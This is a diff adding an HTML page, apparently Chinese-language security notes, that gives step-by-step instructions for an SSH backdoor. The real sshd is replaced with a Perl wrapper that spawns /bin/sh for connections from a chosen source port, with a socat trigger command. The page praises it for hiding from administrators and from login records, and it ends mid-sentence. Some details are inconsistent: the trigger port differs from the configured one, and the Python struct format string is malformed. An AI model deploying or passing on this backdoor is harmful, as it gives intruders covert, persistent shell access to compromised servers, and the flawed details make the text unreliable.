@@ -1,0 +1,21 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="ssh-wrapper"><span class="csDE05BCC">SSH wrapper</span></a></h1>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">判断连接来源端口，将恶意端口来源访问传输内容重定向到</span><span class="cs8926E06">/bin/sh</span><span class="cs9C1B1871">中。</span></p><p class="cs3A447A38"><span class="cs9FB05234">cd /usr/sbin/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mv sshd ../bin</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">vim sshd //</span><span class="cs7FFD2630">编辑</span><span class="cs9FB05234">sshd</span><span class="cs7FFD2630">内容为以下</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#!/usr/bin/perl</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..LF/); // \x00\x00LF</span><span class="cs7FFD2630">是</span><span class="cs9FB05234">19526</span><span class="cs7FFD2630">的大端形式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exec{&quot;/usr/bin/sshd&quot;}&quot;/usr/sbin/sshd&quot;,@ARGV;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service sshd restart</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在本机执行</span></p><p class="cs3A447A38"><span class="cs9FB05234">socat STDIO TCP4:127.0.0.1:22,sourceport=19265</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/SSH%20wrapper%20_files/image0.png" width="560" height="66" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到我利用</span><span class="cs8926E06">socat</span><span class="cs9C1B1871">限制了本地端口</span><span class="cs8926E06">19526</span><span class="cs9C1B1871">访问</span><span class="cs8926E06">server</span><span class="cs9C1B1871">的</span><span class="cs8926E06">22</span><span class="cs9C1B1871">端口反回一个</span><span class="cs8926E06">sh</span><span class="cs9C1B1871">窗。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">修改端口可以修改</span><span class="cs8926E06">..LF</span></p><p class="cs3A447A38"><span class="cs9FB05234">import struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">buffer = struct.pack(&#39;&gt;I6&#39;,19526)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print repr(buffer)</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/SSH%20wrapper%20_files/image1.png" width="560" height="447" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">优点：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1</span><span class="cs9C1B1871">、在无连接后门的情况下，管理员是看不到端口和进程的，</span><span class="cs8926E06">last</span><span class="cs9C1B1871">也查不到登陆。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2</span><span class="cs9C1B1871">、在针对边界设备出网，内网</span><span class="cs8926E06">linux</span><span class="cs9C1B1871">服务器未出网的情况下，留这个后门可以随时管理内网</span><span class="cs8926E06">linux</span><span class="cs9C1B1871">服务器，还不会留下文件和</span></p></body>
+</html>
